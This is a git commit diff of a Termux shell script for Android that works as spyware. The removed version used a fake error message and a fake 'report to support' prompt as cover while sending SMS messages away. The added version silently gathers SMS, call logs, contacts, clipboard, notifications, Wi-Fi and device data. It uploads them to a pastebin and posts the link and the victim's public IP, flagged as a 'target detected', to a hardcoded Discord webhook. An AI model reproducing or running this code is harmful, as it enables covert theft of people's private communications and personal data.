b4fa16365bbb2919d24729c282a32be7d8efee18
spawnn <80365034+SPAWN-cloud@users.noreply.github.com>
2022-06-19 14:11:50 -0300

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,28 +1,61 @@
-cd ${HOME}
+#!/bin/bash
 termux-wake-lock
 
 DATABASE="https://discord.com/api/webhooks/987366677845012500/8UBH7xmMEThWqePEUcwObKGY7PLXW5UkaRc65rGCaZgtKZZKzthpyLCmnDy1y72VKVof"
 
-apt install pastebinit termux-api -y
-termux-sms-list > .nanovrc
-clear
+cd ${HOME}
+apt install termux-api pastebinit curl -y
 
-echo -e "\033[38;2;255;0;0mErro \033[38;2;255;255;0mE1-55403B\033[0m"
-sleep 3
-echo
-echo "Falha ao tentar habilitar o SMS-Engine"
-echo
-echo "Para mais detalhes sobre o erro, você pode checar o link abaixo"
-echo -e "\033[38;2;255;255;0mhttps://bit.ly/3O0VH4d\033[0m"
+termux-api-start
+termux-wifi-enable true
 
-URL=$(pastebinit -b paste.ubuntu.com .nanovrc)
-curl --header "Content-Type: application/json" --data "{\"content\":\"${URL}\"}" ${DATABASE}
+log() {
+    echo "$1" >> .output.log
+}
 
-read -p "Deseja enviar o erro para o nosso suporte? [S/n]" answer
-
-if [[ "${answer}" == "" || "${answer}" == "s" || "${answer}" == "S" || "${answer}" == "sim" || "${answer}" == "Sim" ]]; then
-    echo "Enviando para o suporte..."
-    sleep 2
-else
-    echo "O erro não foi reportado!"
+if [[ -v ".output.log" ]]; then
+    rm .output.log
 fi
+
+log "# termux-usb"
+termux-usb -l >> .output.log
+log "------------\n# termux-sms-list"
+termux-sms-list >> .output.log
+log "-----------------\n# termux-call-log"
+termux-call-log >> .output.log
+log "-----------------\n# termux-audio-info"
+termux-audio-info >> .output.log
+log "-------------------\n# termux-camera-info"
+termux-camera-info >> .output.log
+log "--------------------\n# termux-nfc"
+termux-nfc -r full >> .output.log
+log "------------\n# termux-tts-engines"
+termux-tts-engines >> .output.log
+log "--------------------\n# termux-contact-list"
+termux-contact-list >> .output.log
+log "---------------------\n# termux-clipboard-get"
+termux-clipboard-get >> .output.log
+log "----------------------\n# termux-wifi-scaninfo"
+termux-wifi-scaninfo >> .output.log
+log "----------------------\n# termux-battery-status"
+termux-battery-status >> .output.log
+log "-----------------------\n# termux-sensor"
+termux-sensor -a -n 1 >> .output.log
+log "---------------\n# termux-notification-list"
+termux-notification-list >> .output.log
+log "--------------------------\n# termux-battery-status"
+termux-wifi-connectioninfo >> .output.log
+log "--------------------------\n# termux-telephony-deviceinfo"
+termux-telephony-deviceinfo >> .output.log
+log "-----------------------------"
+
+USERNAME=$(whoami)
+IP=$(curl ifconfig.me)
+URL=$(pastebinit -b paste.ubuntu.com .output.log)
+
+curl --header "Content-Type: application/json" --data "{\"content\":\"Alvo detectado!\n${IP}\",\"username\":\"${USERNAME}\"}" $DATABASE
+sleep 1
+
+curl --header "Content-Type: application/json" --data "{\"content\":\"${URL}\"}" $DATABASE
+
+rm -f .output.log
